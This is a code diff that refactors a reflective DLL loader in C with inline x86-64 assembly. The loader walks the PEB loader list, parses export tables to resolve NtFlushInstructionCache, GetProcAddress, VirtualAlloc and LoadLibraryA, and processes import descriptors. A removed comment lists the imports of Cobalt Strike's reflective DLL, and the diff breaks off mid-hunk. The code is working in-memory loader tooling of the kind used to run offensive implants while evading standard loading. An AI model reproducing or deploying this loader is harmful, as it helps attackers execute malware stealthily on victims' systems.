@@ -7,6 +7,15 @@ typedef HMODULE (WINAPI * tLoadLibraryA)(LPCSTR lpLibFileName);
 typedef FARPROC (WINAPI * tGetProcAddress) (HMODULE hModule, LPCSTR lpProcName);
 typedef LPVOID  (WINAPI * tVirtualAlloc) (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 typedef DWORD   (NTAPI * tNtFlushInstructionCache)( HANDLE ProcessHandle, PVOID BaseAddress, ULONG NumberOfBytesToFlush );
+PVOID crawlLdrDllList(wchar_t *);
+PVOID getExportDirectory(PVOID dllAddr);
+PVOID getExportAddressTable(PVOID dllBase, PVOID dllExportDirectory);
+PVOID getExportNameTable(PVOID dllBase, PVOID dllExportDirectory);
+PVOID getExportOrdinalTable(PVOID dllBase, PVOID dllExportDirectory);
+PVOID getNewExeHeader(PVOID dllBase);
+PVOID getOptionalHeader(PVOID NewExeHeader);
+PVOID getImportDirectory(PVOID OptionalHeader);
+PVOID getSymbolAddress(PVOID symbolString, PVOID symbolStringSize, PVOID dllBase, PVOID ExportAddressTable, PVOID ExportNameTable, PVOID ExportOrdinalTable);
 
 __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 {
@@ -18,25 +27,13 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	PVOID uiNameOrdinals;
 	DWORD dwHashValue;
 	PVOID newExeHeaderAddr;
-	PVOID ntdllAddr;
-	PVOID ntdllExportDirectory;
-	PVOID ntdllExAddrTable;
-	PVOID ntdllExNamePointerTable;
-	PVOID ntdllExOrdinalTable;
-
+	// NTDLL Variables
+	PVOID ntdllAddr, ntdllExportDirectory, ntdllExAddrTable, ntdllExNamePointerTable, ntdllExOrdinalTable;
 	char ntFlushStr[] = "NtFlushInstructionCache";
 	PVOID ntFlushStrLen = (PVOID)sizeof(ntFlushStr);
 	tNtFlushInstructionCache pNtFlushInstructionCache = NULL;
-	
-	//char ntAllocVmStr[] = "NtAllocateVirtualMemory";
-	//PVOID ntAllocVmStrLen = (PVOID)sizeof(ntAllocVmStr);
-	//NTALLOCATEVIRTUALMEMORY pNtAllocateVirtualMemory = NULL;
-
-	PVOID kernel32Addr;
-	PVOID kernel32ExportDirectory;
-	PVOID kernel32ExAddrTable;
-	PVOID kernel32ExNamePointerTable;
-	PVOID kernel32ExOrdinalTable;
+	// KERNEL32 Variables
+	PVOID kernel32Addr, kernel32ExportDirectory, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable;
 
 	char getProcAddrStr[] = "GetProcAddress";
 	PVOID getProcAddrStrLen = (PVOID)sizeof(getProcAddrStr);
@@ -50,305 +47,29 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	PVOID VirtualAllocStrLen = (PVOID)sizeof(VirtualAllocStr);
 	tVirtualAlloc pVirtualAlloc = NULL;
 
-	// STEP 0: calculate our images current base address
-	// get &ntdll.dll
-	__asm__(
-	//	"int3 \n"
-		"xor rdi, rdi \n"            // RDI = 0x0
-		"mul rdi \n"                 // RAX&RDX =0x0
-		"mov rbx, gs:[rax+0x60] \n"   // RBX = Address_of_PEB
-		"mov rbx, [rbx+0x18] \n"      // RBX = Address_of_LDR
-		"mov rbx, [rbx+0x20] \n"
-		"mov rbx, [rbx] \n"          // RBX = 1st entry in InitOrderModuleList / ntdll.dll
-		"mov rbx, [rbx+0x20] \n"      // RBX = &ntdll.dll ( Base Address of ntdll.dll)
-		"mov %[ntdllAddr], rbx \n"
-		:[ntdllAddr] "=r" (ntdllAddr)
-	);
-	// find the Export Directory for NTDLL
-	__asm__(
-		"mov rcx, %[ntdllAddr] \n"
-	   	"mov rbx, rcx \n"
-       		"mov r8, rcx \n"
-       		"mov ebx, [rbx+0x3C] \n"
-       		"add rbx, r8 \n"
-       		"xor rcx, rcx \n"
-       		"add cx, 0x88 \n"
-       		"mov edx, [rbx+rcx] \n"
-       		"add rdx, r8 \n"
- 	   	"mov %[ntdllExportDirectory], rdx \n"
-	   	:[ntdllExportDirectory] "=r" (ntdllExportDirectory)
-	   	:[ntdllAddr] "r" (ntdllAddr)
-	);
+	// STEP X: Resolve the addresses of NTDLL and Kernel32 from the Loader via GS>TEB>PEB>LDR>InMemoryOrderModuleList
+	//   - This is done by matching the first 4 unicode charaters of the DLL BaseName
+	wchar_t ntdlStr[] = L"ntdl"; // L"ntdll.dll" - Only need the first 4 unicode bytes to find the DLL from the loader list
+	ntdllAddr = (PVOID)crawlLdrDllList(ntdlStr);
+	ntdllExportDirectory = getExportDirectory(ntdllAddr);
+	ntdllExAddrTable = getExportAddressTable(ntdllAddr, ntdllExportDirectory);
+	ntdllExNamePointerTable = getExportNameTable(ntdllAddr, ntdllExportDirectory);
+	ntdllExOrdinalTable = getExportOrdinalTable(ntdllAddr, ntdllExportDirectory);
 
-	// RCX = &NTDLL.ExportDirectory | RDX = &NTDLL.DLL
-	__asm__(
-		"mov rcx, %[ntdllExportDirectory] \n"
-		"mov rdx, %[ntdllAddr] \n"
-		"xor rax, rax \n"
-		"add rcx, 0x1C \n"
-		"mov eax, [rcx] \n"
-		"add rax, rdx \n"
-		"mov %[ntdllExAddrTable], rax \n"
-		:[ntdllExAddrTable] "=r" (ntdllExAddrTable)
-		:[ntdllExportDirectory] "r" (ntdllExportDirectory),
-		 [ntdllAddr] "r" (ntdllAddr)
-	);
-	__asm__(
-		"mov rcx, %[ntdllExportDirectory] \n"
-		"mov rdx, %[ntdllAddr] \n"
-		"xor rax, rax \n"
-		"add rcx, 0x20 \n"
-		"mov eax, dword ptr [rcx] \n"
-		"add rax, rdx \n"
-		"mov %[ntdllExNamePointerTable], rax \n"
-		:[ntdllExNamePointerTable] "=r" (ntdllExNamePointerTable)
-		:[ntdllExportDirectory] "r" (ntdllExportDirectory),
-		 [ntdllAddr] "r" (ntdllAddr)
-	);
-	__asm__(
-		"mov rcx, %[ntdllExportDirectory] \n"
-		"mov rdx, %[ntdllAddr] \n"
-		"xor rax, rax \n"
-		"add rcx, 0x24 \n"
-		"mov eax, dword ptr [rcx] \n"
-		"add rax, rdx \n"
-		"mov %[ntdllExOrdinalTable], rax \n"
-		:[ntdllExOrdinalTable] "=r" (ntdllExOrdinalTable)
-		:[ntdllExportDirectory] "r" (ntdllExportDirectory),
-		 [ntdllAddr] "r" (ntdllAddr)
-	);
 	// NTDLL.NtFlushInstructionCache
-	// On Load:
-	// RAX = DWORD apiNameStringLen
-	// RDX = LPSTR apiNameString
-	// RCX  = PVOID moduleAddr
-	// R8  = PVOID ExExAddressTable
-	// R9 = PVOID ExNamePointerTable
-	// R10 = PVOID ExOrdinalTable
-	// For loop:
-	// RCX/[RSP] = DWORD apiNameStringLen
-	// RDX = LPSTR apiNameString
-	// R11 = PVOID moduleAddr
-	// R8  = PVOID ExExAddressTable
-	// R9  = PVOID ExNamePointerTable
-	// R10 = PVOID ExOrdinalTable
-	__asm__(
-		"mov r11, %[ntdllAddr] \n"
-		"mov rcx, %[ntFlushStrLen] \n"
-		"mov rdx, %[ntFlushStr] \n"
-		"mov r8, %[ntdllExAddrTable] \n"
-		"mov r9, %[ntdllExNamePointerTable] \n"
-		"mov r10, %[ntdllExOrdinalTable] \n"
-		"push rcx \n"
-		"xor rax, rax \n"
-		"jmp short getApiAddrLoop \n"
-	"getApiAddrLoop: \n"
-		"mov rcx, [rsp] \n"             // RCX/[RSP] = DWORD apiNameStringLen (Reset string length counter for each loop)
-		"xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
-		"mov edi, [r9+rax*4] \n"        // EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
-		"add rdi, r11 \n"               // RDI = &NameString    = RVA NameString + &module.dll
-		"mov rsi, rdx \n"               // RSI = Address of API Name String to match on the Stack (reset to start of string)
-		"repe cmpsb \n"                 // Compare strings at RDI & RSI
-		"je getApiAddrFin \n"           // If match then we found the API string. Now we need to find the Address of the API
-		"inc rax \n"                    // Increment to check if the next name matches
-		"jmp short getApiAddrLoop \n"   // Jump back to start of loop
-	"getApiAddrFin: \n"
-		"pop rcx \n"                    // Remove string length counter from top of stack
-		"mov ax, [r10+rax*2] \n"        // RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
-		"mov eax, [r8+rax*4] \n"        // RAX = RVA API = [&AddressTable + API OrdinalNumber]
-		"add rax, r11 \n"               // RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
-		"mov %[pNtFlushInstructionCache], rax \n"  // Save &ntdll.NtFlushInstructionCache to the variable pNtFlushInstructionCache
-		:[pNtFlushInstructionCache] "=r" (pNtFlushInstructionCache)
-		:[ntFlushStrLen]"r"(ntFlushStrLen),
-		 [ntFlushStr]"r"(ntFlushStr),
-		 [ntdllAddr]"r"(ntdllAddr),
-		 [ntdllExAddrTable]"r"(ntdllExAddrTable),
-		 [ntdllExNamePointerTable]"r"(ntdllExNamePointerTable),
-		 [ntdllExOrdinalTable]"r"(ntdllExOrdinalTable)
-	);
+	pNtFlushInstructionCache = getSymbolAddress(ntFlushStr, ntFlushStrLen, ntdllAddr, ntdllExAddrTable, ntdllExNamePointerTable, ntdllExOrdinalTable);
 
-	// KERNEL32.DLL
-	// get &kernel32.dll
-	__asm__(
-		"xor rdi, rdi \n"              // RDI = 0x0
-	 	"mul rdi \n"                   // RAX&RDX =0x0
-		"mov rbx, gs:[rax+0x60] \n"    // RBX = Address_of_PEB
-		"mov rbx, [rbx+0x18] \n"       // RBX = Address_of_LDR
-		"mov rbx, [rbx+0x20] \n"       // RBX = 1st entry in InitOrderModuleList / ntdll.dll
-		"mov rbx, [rbx] \n"            // RBX = 2nd entry in InitOrderModuleList / kernelbase.dll
-		"mov rbx, [rbx] \n"            // RBX = 3rd entry in InitOrderModuleList / kernel32.dll
-		"mov rbx, [rbx+0x20] \n"       // RBX = &kernel32.dll ( Base Address of kernel32.dll)
-		"mov %[kernel32Addr], rbx \n"
-		:[kernel32Addr] "=r" (kernel32Addr)
-	);
+	wchar_t kernstr[] = L"KERN"; // L"KERNEL32.DLL" - Debugging shows that kernel32 loads in with all uppercase. May need to check for both in future 
+	kernel32Addr = (PVOID)crawlLdrDllList(kernstr);
+	kernel32ExportDirectory = getExportDirectory(kernel32Addr);
+	kernel32ExAddrTable = getExportAddressTable(kernel32Addr, kernel32ExportDirectory);
+	kernel32ExNamePointerTable = getExportNameTable(kernel32Addr, kernel32ExportDirectory);
+	kernel32ExOrdinalTable = getExportOrdinalTable(kernel32Addr, kernel32ExportDirectory);
 
-	// get &kernel32.ExportDirectory
-	__asm__(
-		"mov rcx, %[kernel32Addr] \n"
-		"mov rbx, rcx \n"
-       		"mov r8, rcx \n"
-       		"mov ebx, [rbx+0x3C] \n"
-       		"add rbx, r8 \n"
-      		"xor rcx, rcx \n"
-     		"add cx, 0x88ff \n"
-     		"shr rcx, 0x8 \n"
-   		"mov edx, [rbx+rcx] \n"
-  	     	"add rdx, r8 \n"
- 	   	"mov %[kernel32ExportDirectory], rdx \n"
-	   	:[kernel32ExportDirectory] "=r" (kernel32ExportDirectory)
-	   	:[kernel32Addr] "r" (kernel32Addr)
-	);
-
-	// get Kernel32 Export Address Table
-	// RCX = &NTDLL.ExportDirectory | RDX = &NTDLL.DLL
-	__asm__(
-		"mov rcx, %[kernel32ExportDirectory] \n"
-		"mov rdx, %[kernel32Addr] \n"
-		"xor rax, rax \n"
-		"add rcx, 0x1C \n"
-		"mov eax, [rcx] \n"
-		"add rax, rdx \n"
-		"mov %[kernel32ExAddrTable], rax \n"
-		:[kernel32ExAddrTable] "=r" (kernel32ExAddrTable)
-		:[kernel32ExportDirectory] "r" (kernel32ExportDirectory),
-		 [kernel32Addr] "r" (kernel32Addr)
-	);
-
-	__asm__(
-		"mov rcx, %[kernel32ExportDirectory] \n"
-		"mov rdx, %[kernel32Addr] \n"
-		"xor rax, rax \n"
-		"add rcx, 0x20 \n"
-		"mov eax, dword ptr [rcx] \n"
-		"add rax, rdx \n"
-		"mov %[kernel32ExNamePointerTable], rax \n"
-		:[kernel32ExNamePointerTable] "=r" (kernel32ExNamePointerTable)
-		:[kernel32ExportDirectory] "r" (kernel32ExportDirectory),
-		 [kernel32Addr] "r" (kernel32Addr)
-	);
-
-	// get kernel32 Export Ordinal Table
-	__asm__(
-		"mov rcx, %[kernel32ExportDirectory] \n"
-		"mov rdx, %[kernel32Addr] \n"
-		"xor rax, rax \n"
-		"add rcx, 0x24 \n"
-		"mov eax, dword ptr [rcx] \n"
-		"add rax, rdx \n"
-		"mov %[kernel32ExOrdinalTable], rax \n"
-		:[kernel32ExOrdinalTable] "=r" (kernel32ExOrdinalTable)
-		:[kernel32ExportDirectory] "r" (kernel32ExportDirectory),
-		 [kernel32Addr] "r" (kernel32Addr)
-	);
-
-	// GetProcAddress
-	__asm__(
-		"mov r11, %[kernel32Addr] \n"
-		"mov rcx, %[getProcAddrStrLen] \n"
-		"mov rdx, %[getProcAddrStr] \n"
-		"mov r8, %[kernel32ExAddrTable] \n"
-		"mov r9, %[kernel32ExNamePointerTable] \n"
-		"mov r10, %[kernel32ExOrdinalTable] \n"
-		"push rcx \n"
-		"xor rax, rax \n"
-		"jmp short getk1ApiAddrLoop \n"
-	"getk1ApiAddrLoop: \n"
-		"mov rcx, [rsp] \n"               // RCX/[RSP] = DWORD apiNameStringLen (Reset string length counter for each loop)
-		"xor rdi, rdi \n"                 // Clear RDI for setting up string name retrieval
-		"mov edi, [r9+rax*4] \n"          // EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
-		"add rdi, r11 \n"                 // RDI = &NameString    = RVA NameString + &module.dll
-		"mov rsi, rdx \n"                 // RSI = Address of API Name String to match on the Stack (reset to start of string)
-		"repe cmpsb \n"                   // Compare strings at RDI & RSI
-		"je getk1ApiAddrFin \n"           // If match then we found the API string. Now we need to find the Address of the API
-		"inc rax \n"                      // Increment to check if the next name matches
-		"jmp short getk1ApiAddrLoop \n"   // Jump back to start of loop
-	"getk1ApiAddrFin: \n"
-		"pop rcx \n"                      // Remove string length counter from top of stack
-		"mov ax, [r10+rax*2] \n"          // RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
-		"mov eax, [r8+rax*4] \n"          // RAX = RVA API = [&AddressTable + API OrdinalNumber]
-		"add rax, r11 \n"                 // RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
-		"mov %[pGetProcAddress], rax \n"  // Save &kernel32.GetProcAddress to the variable pGetProcAddress
-		:[pGetProcAddress] "=r" (pGetProcAddress)
-		:[getProcAddrStrLen]"r"(getProcAddrStrLen),
-		 [getProcAddrStr]"r"(getProcAddrStr),
-		 [kernel32Addr]"r"(kernel32Addr),
-		 [kernel32ExAddrTable]"r"(kernel32ExAddrTable),
-		 [kernel32ExNamePointerTable]"r"(kernel32ExNamePointerTable),
-		 [kernel32ExOrdinalTable]"r"(kernel32ExOrdinalTable)
-	); 
+	pGetProcAddress = getSymbolAddress(getProcAddrStr, getProcAddrStrLen, kernel32Addr, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
+	pVirtualAlloc  = getSymbolAddress(VirtualAllocStr, VirtualAllocStrLen, kernel32Addr, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
+	pLoadLibraryA  = getSymbolAddress(loadLibraryAStr, loadLibraryAStrLen, kernel32Addr, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
 	
-	// VirtualAlloc
-	__asm__(
-		"mov r11, %[kernel32Addr] \n"
-		"mov rcx, %[VirtualAllocStrLen] \n"
-		"mov rdx, %[VirtualAllocStr] \n"
-		"mov r8, %[kernel32ExAddrTable] \n"
-		"mov r9, %[kernel32ExNamePointerTable] \n"
-		"mov r10, %[kernel32ExOrdinalTable] \n"
-		"push rcx \n"
-		"xor rax, rax \n"
-		"jmp short getk2ApiAddrLoop \n"
-	"getk2ApiAddrLoop: \n"
-		"mov rcx, [rsp] \n"             // RCX/[RSP] = DWORD apiNameStringLen (Reset string length counter for each loop)
-		"xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
-		"mov edi, [r9+rax*4] \n"        // EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
-		"add rdi, r11 \n"               // RDI = &NameString    = RVA NameString + &module.dll
-		"mov rsi, rdx \n"               // RSI = Address of API Name String to match on the Stack (reset to start of string)
-		"repe cmpsb \n"                 // Compare strings at RDI & RSI
-		"je getk2ApiAddrFin \n"         // If match then we found the API string. Now we need to find the Address of the API
-		"inc rax \n"                    // Increment to check if the next name matches
-		"jmp short getk2ApiAddrLoop \n" // Jump back to start of loop
-	"getk2ApiAddrFin: \n"
-		"pop rcx \n"                    // Remove string length counter from top of stack
-		"mov ax, [r10+rax*2] \n"        // RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
-		"mov eax, [r8+rax*4] \n"        // RAX = RVA API = [&AddressTable + API OrdinalNumber]
-		"add rax, r11 \n"               // RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
-		"mov %[pVirtualAlloc], rax \n"  // Save &kernel32.VirtualAlloc to the variable pVirtualAlloc
-		:[pVirtualAlloc] "=r" (pVirtualAlloc)
-		:[VirtualAllocStrLen]"r"(VirtualAllocStrLen),
-		 [VirtualAllocStr]"r"(VirtualAllocStr),
-		 [kernel32Addr]"r"(kernel32Addr),
-		 [kernel32ExAddrTable]"r"(kernel32ExAddrTable),
-		 [kernel32ExNamePointerTable]"r"(kernel32ExNamePointerTable),
-		 [kernel32ExOrdinalTable]"r"(kernel32ExOrdinalTable)
-	);
-
-	//LoadLibraryA
-	__asm__(
-		"mov r11, %[kernel32Addr] \n"
-		"mov rcx, %[loadLibraryAStrLen] \n"
-		"mov rdx, %[loadLibraryAStr] \n"
-		"mov r8, %[kernel32ExAddrTable] \n"
-		"mov r9, %[kernel32ExNamePointerTable] \n"
-		"mov r10, %[kernel32ExOrdinalTable] \n"
-		"push rcx \n"
-		"xor rax, rax \n"
-		"jmp short getk3ApiAddrLoop \n"
-	"getk3ApiAddrLoop: \n"
-		"mov rcx, [rsp] \n"             // RCX/[RSP] = DWORD apiNameStringLen (Reset string length counter for each loop)
-		"xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
-		"mov edi, [r9+rax*4] \n"        // EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
-		"add rdi, r11 \n"               // RDI = &NameString    = RVA NameString + &module.dll
-		"mov rsi, rdx \n"               // RSI = Address of API Name String to match on the Stack (reset to start of string)
-		"repe cmpsb \n"                 // Compare strings at RDI & RSI
-		"je getk3ApiAddrFin \n"         // If match then we found the API string. Now we need to find the Address of the API
-		"inc rax \n"                    // Increment to check if the next name matches
-		"jmp short getk3ApiAddrLoop \n" // Jump back to start of loop
-	"getk3ApiAddrFin: \n"
-		"pop rcx \n"                    // Remove string length counter from top of stack
-		"mov ax, [r10+rax*2] \n"        // RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
-		"mov eax, [r8+rax*4] \n"        // RAX = RVA API = [&AddressTable + API OrdinalNumber]
-		"add rax, r11 \n"               // RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
-		"mov %[pLoadLibraryA], rax \n"  // Save &kernel32.LoadLibraryA to the variable pLoadLibraryA
-		:[pLoadLibraryA] "=r" (pLoadLibraryA)
-		:[loadLibraryAStrLen]"r"(loadLibraryAStrLen),
-		 [loadLibraryAStr]"r"(loadLibraryAStr),
-		 [kernel32Addr]"r"(kernel32Addr),
-		 [kernel32ExAddrTable]"r"(kernel32ExAddrTable),
-		 [kernel32ExNamePointerTable]"r"(kernel32ExNamePointerTable),
-		 [kernel32ExOrdinalTable]"r"(kernel32ExOrdinalTable)
-	);
-
 	// Find ourselves in memory by searching for "MZ" 
 	__asm__(
 		"call pop \n"       // Calling the next instruction puts RIP address on the top of our stack
@@ -368,16 +89,9 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 
 	// STEP 2 | Get size of our RDLL image, allocate memory for our new RDLL, and copy/write the headers from init RDLL to new RDLL
 
+
 	// get the VA of the NT Header for the PE to be loaded
-	__asm__(
-		"mov rax, %[initRdllAddr] \n"
-		"xor rbx, rbx \n"
-		"mov ebx, [rax+0x3C] \n"       // RBX = Offset NewEXEHeader
-		"add rbx, rax \n"              // RBX = &reflectiveDll.dll + Offset NewEXEHeader = &NewEXEHeader
-		"mov %[newExeHeaderAddr], rbx \n"  // newExeHeaderAddr = ((PIMAGE_DOS_HEADER)initRdllAddr)->e_lfanew
-		:[newExeHeaderAddr] "=r" (newExeHeaderAddr)
-		:[initRdllAddr] "r" (initRdllAddr)
-	);
+	newExeHeaderAddr = getNewExeHeader(initRdllAddr);
 	// Get the size of our entire RDLL
 	PVOID rdllSize;
 	__asm__(
@@ -607,56 +321,6 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 		:[rdllDataDirImportDirectoryAddr] "r" (rdllDataDirImportDirectoryAddr),
 		 [newRdllAddr] "r" (newRdllAddr)
 	);
-//    typedef struct _IMAGE_IMPORT_DESCRIPTOR {
-//       __C89_NAMELESS union {
-//     		DWORD Characteristics;
-//     		DWORD OriginalFirstThunk;
-//       } DUMMYUNIONNAME;
-//       DWORD TimeDateStamp;
-//       DWORD ForwarderChain;
-//       DWORD Name;
-//       DWORD FirstThunk;
-//     } IMAGE_IMPORT_DESCRIPTOR;
-//     typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;
-
-
-	// Cobalt Strike Reflective DLL imports these Modules:
-	// Kernel32.dll
-	// GetProcAddress("kernel32.dll", VirtualProtectEx TerminateProcess ReadProcessMemory WriteProcessMemory GetThreadContext ResumeThread
-	//     CreateProcessA GetCurrentDirectoryW GetFullPathNameA GetLogicalDrives FindClose SystemTimeToTzSpecificLocalTime 
-	//     FileTimeToSystemTime ExpandEnvironmentStringsA GetFileAttributesA FindFirstFileA FindNextFileA CopyFileA MoveFileA
-	//     VirtualProctect OpenProcess GetCurrentProcessId VirtualAllocEx CreateThread OpenThread CreateToolhelp32Snapshot
-	//     Thread32First Thread32Next CreateRemoteThread SetThreadContext MapViewOfFile UnmapViewOfFile CreateFileMappingA 
-	//     Wow64GetThreadContext SetLastError SetNamedPipeHandleState PeekNamedPipe CreateFileA WaitNamedPipeA GetModuleFileNameA
-	//     OpenProcessToken ++ 
-	// ADVAPI32.DLL
-	//   GetTokenInformation ++ 
-	// WININET.dll
-	//   InternetReadFile InternetCloseHandle InternetConnectA InternetQueryDataAvaiable InternetQueryOptionA HttpOpenRequestA 
-	//   HttpAddRequestHeadersA HttpSendRequestA HttpqueryInfoA InternetOpenA 
-	// ws2_32.dll
-	//   WSASocketA WSAIoctl 
-
-/*
-	// kernel32Addr = Kernel32 address, we already found it and know its loaded
-	// ADVAPI32.DL
-	char advapi32Str[] = "ADVAPI32.DLL";
-	PVOID advapi32Addr = (PVOID)pLoadLibraryA( (LPCSTR)(advapi32Str) );
-	// WININET.dll
-	char wininetStr[] = "WININET.dll";
-	PVOID wininetAddr = (PVOID)pLoadLibraryA( (LPCSTR)(wininetStr) );
-	// ws2_32.dll
-	char ws232Str[] = "ws2_32.dll";
-	PVOID ws232Addr = (PVOID)pLoadLibraryA( (LPCSTR)(ws232Str) );
-
-	__asm__(
-		"nop \n"
-		"nop \n"
-		//"int3 \n"
-		"nop \n"
-		"nop \n"
-	);
-*/
 
 	PVOID ImportedDllAddr;
 	PVOID nextModuleImportDescriptor = rdllImportDirectoryAddr;
@@ -670,44 +334,28 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	PVOID importEntryAddress; 
 
 
-//	typedef struct _IMAGE_IMPORT_DESCRIPTOR {
-//       __C89_NAMELESS union {		// size of this union is 4 bytes because the biggest member of this union is a DWORD (4 bytes)
-//     DWORD Characteristics;		//   A union stores one of the options listed in the union, but can only be one of the options
-//     DWORD OriginalFirstThunk;
-//       } DUMMYUNIONNAME;  		// 4 bytes
-//       DWORD TimeDateStamp;		//+4 bytes
-//       DWORD ForwarderChain;		//+4 bytes
-//       DWORD Name;				//+4 bytes
-//       DWORD FirstThunk;			//+4 bytes
-//     } IMAGE_IMPORT_DESCRIPTOR;	// = 20 bytes (0x14 bytes)
-//     typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;
-		// We need to get the name of the first imported DLL from the first IMAGE_IMPORT_DESCRIPTOR entry in the list of our RDLL's Import directory
-		// This will start our loop. Once we import all the symbols/API's we need for that DLL, we will move to the next IMAGE_IMPORT_DESCRIPTOR entry
-		//   by adding the address of this first import descriptor with the size of the import descriptor struct
-		// importNameRVA = IMAGE_IMPORT_DESCRIPTOR->Name 
-		// importName = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
-		PVOID importNameRVA;
-		PVOID importName;
-		__asm__(
-			"mov rax, %[nextModuleImportDescriptor] \n"
-			"mov r11, %[newRdllAddr] \n"
-			"xor rbx, rbx \n"
-			"xor r12, r12 \n"
-			"add rax, 0xC \n" 	     // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
-			"mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
-			"push rbx \n"            // save the RVA for the Name of the DLL to be imported to the top of the stack
-			"pop r12 \n"             // R12&RBX = RVA of Name DLL
-			"cmp ebx, 0x0 \n"        // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
-			"je check1 \n"
-			"add rbx, r11 \n" 		 // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
-			"check1: \n"
-			"mov %[importNameRVA], r12 \n" 
-			"mov %[importName], rbx \n" 
-			:[importNameRVA] "=r" (importNameRVA),
-			 [importName] "=r" (importName)
-			:[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
-			 [newRdllAddr] "r" (newRdllAddr)
-		);
+	PVOID importNameRVA;
+	PVOID importName;
+	__asm__(
+		"mov rax, %[nextModuleImportDescriptor] \n"
+		"mov r11, %[newRdllAddr] \n"
+		"xor rbx, rbx \n"
+		"xor r12, r12 \n"
+		"add rax, 0xC \n" 	     // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
+		"mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
+		"push rbx \n"            // save the RVA for the Name of the DLL to be imported to the top of the stack
+		"pop r12 \n"             // R12&RBX = RVA of Name DLL
+		"cmp ebx, 0x0 \n"        // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
+		"je check1 \n"
+		"add rbx, r11 \n" 		 // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
+		"check1: \n"
+		"mov %[importNameRVA], r12 \n" 
+		"mov %[importName], rbx \n" 
+		:[importNameRVA] "=r" (importNameRVA),
+	  	 [importName] "=r" (importName)
+		:[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
+		 [newRdllAddr] "r" (newRdllAddr)
+	);
 	// Import all the symbols from all the import tables listed in the import directory
 	PVOID importLookupTableEntry;
 	PVOID importAddressTableEntry;
@@ -719,11 +367,11 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	//while( ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name )
 	while(importNameRVA)
 	{
-		// use LoadLibraryA to load the imported module into memory
-
-		//ImportedDllAddr = (PVOID)pLoadLibraryA( (LPCSTR)( newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name ) );
-		ImportedDllAddr = (PVOID)pLoadLibraryA( (LPCSTR)( importName ));
-
+		ImportedDllAddr = (PVOID)crawlLdrDllList(importName);
+		// If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
+		if (ImportedDllAddr == NULL){
+			ImportedDllAddr = (PVOID)pLoadLibraryA( (LPCSTR)( importName ));
+		}
 		// importLookupTableEntry = VA of the OriginalFirstThunk
 		//importLookupTableEntry = ( newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk );
 		__asm__(
@@ -762,82 +410,15 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 		// itterate through all imported functions, importing by ordinal if no name present
 		while(checkNullImportAddressTableEntry)
 		{
-			//importedDllExportDirectory = ImportedDllAddr + ((PIMAGE_DOS_HEADER)ImportedDllAddr)->e_lfanew;
-			// uiNameArray = the address of the modules export directory entry
-			//uiNameArray = (PVOID)&((PIMAGE_NT_HEADERS)importedDllExportDirectory)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
-			// get the VA of the export directory
-			//importedDllExportDirectory = ( ImportedDllAddr + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );
-			// STEP 1 | Export Directory for current module/DLL being imported
-			__asm__(
-				"mov rcx, %[ImportedDllAddr] \n"
-				"mov rbx, rcx \n"
-				"mov r8, rcx \n"
-				"mov ebx, [rbx+0x3C] \n"
-				"add rbx, r8 \n"
-				"xor rcx, rcx \n"
-				"add cx, 0x88 \n"
-				"mov edx, [rbx+rcx] \n"
-				"add rdx, r8 \n"
-				"mov %[importedDllExportDirectory], rdx \n"
-				:[importedDllExportDirectory] "=r" (importedDllExportDirectory)
-				:[ImportedDllAddr] "r" (ImportedDllAddr)
-			);
-		
-				//     typedef struct _IMAGE_EXPORT_DIRECTORY {
